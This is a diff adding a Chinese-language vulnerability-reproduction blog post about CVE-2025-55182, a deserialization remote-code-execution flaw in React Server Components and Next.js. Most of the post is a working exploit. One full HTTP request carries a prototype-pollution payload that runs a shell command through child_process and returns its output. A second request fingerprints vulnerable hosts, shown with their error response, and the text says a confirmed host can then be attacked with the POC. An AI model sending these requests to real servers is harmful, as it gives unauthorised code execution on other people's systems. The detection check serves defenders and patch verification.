@@ -1,0 +1,98 @@
+---
+title: React Server Components Flight 协议反序列化代码执行（CVE-2025-55182）
+date: 2025-12-15T16:20:00+08:00
+draft: false
+tags:
+  - CVE-2025-55182
+categories:
+  - 漏洞复现
+summary: React Server Components中存在一个未授权的远程代码执行漏洞。攻击者可以向任何Server Function端点发送精心构造的恶意HTTP请求，当React对该请求进行反序列化时，即可在服务器上实现远程代码执行。该漏洞影响react-server-dom-webpack、react-server-dom-parcel和react-server-dom-turbopack的19.0到19.2.0版本，以及依赖这些包的框架（如Next.js）。
+---
+
+## 0x00 漏洞描述
+在 React 服务器组件（RSC）协议中发现了一个关键漏洞。该漏洞被评为CVSS 10.0，在未打补丁的环境中，攻击者能直接进行未授权的远程代码执行。
+## 0x01 影响范围
+该漏洞影响`react-server-dom-webpack`、`react-server-dom-parcel`和`react-server-dom-turbopack`的19.0到19.2.0版本，以及依赖这些包的框架（如Next.js）。
+## 0x02 漏洞复现
+POC
+```http
+POST / HTTP/1.1
+Host: localhost
+Next-Action: x
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Length: 758
+
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="0"
+
+{
+  "then": "$1:__proto__:then",
+  "status": "resolved_model",
+  "reason": -1,
+  "value": "{\"then\":\"$B1337\"}",
+  "_response": {
+    "_prefix": "var res=process.mainModule.require('child_process').execSync('id').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});",
+    "_chunks": "$Q2",
+    "_formData": {
+      "get": "$1:constructor:constructor"
+    }
+  }
+}
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="1"
+
+"$@0"
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="2"
+
+[]
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
+```
+### 关键HTTP头
+- Next-Action: x
+- Content-Type: multipart/form-data; 
+Next.js 只有知道有效 Action ID 的请求才是合法的。但 CVE-2025-55182 这个漏洞在验证 Action ID 之前就触发了。所以 x 可以是任何。
+## 0x03 验证漏洞的存在与通用POC
+虽然有很多种机制也可以判断资产是否运行 RSC 组件，但有 RSC 并不一定存在 RCE 。可用以下HTTP请求来确认 Next.js 应用中该RCE漏洞的存在：
+```http
+POST / HTTP/1.1
+Host: hostname
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0
+Next-Action: x
+X-Nextjs-Request-Id: b5dce965
+Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
+X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9
+Content-Length: 232
+
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="1"
+
+{}
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="0"
+
+["$1:a:a"]
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
+```
+当发送上述请求时，Next.js的易受攻击版本的HTTP响应将呈现如下：
+```http
+HTTP/1.1 500 Internal Server Error
+Date: Thu, 04 Dec 2025 06:16:39 GMT
+Content-Type: text/x-component
+Connection: keep-alive
+Cache-Control: no-store, must-revalidate, no-cache, max-age=0
+Vary: rsc
+Content-Length: 76
+
+0:{"a":"$@1","f":"","b":"yd-J8UfWl70zwtaAy83s7"}
+1:E{"digest":"2971658870"}
+```
+检查是否有`E{"digest"`和500状态码，有的话即代表存在漏洞。
+存在即可以使用 POC 进行RCE。
+	注：Burp自2025.10.7后更新可以检测CVE-2025-55182, CVE-2025-66478
+
+参考链接：
+- https://github.com/vulhub/vulhub/tree/c0e208052006459cfeedefa8daab8f790809e874/react/CVE-2025-55182
+- https://slcyber.io/research-center/high-fidelity-detection-mechanism-for-rsc-next-js-rce-cve-2025-55182-cve-2025-66478/
+- https://github.com/zzhorc/CVE-2025-55182
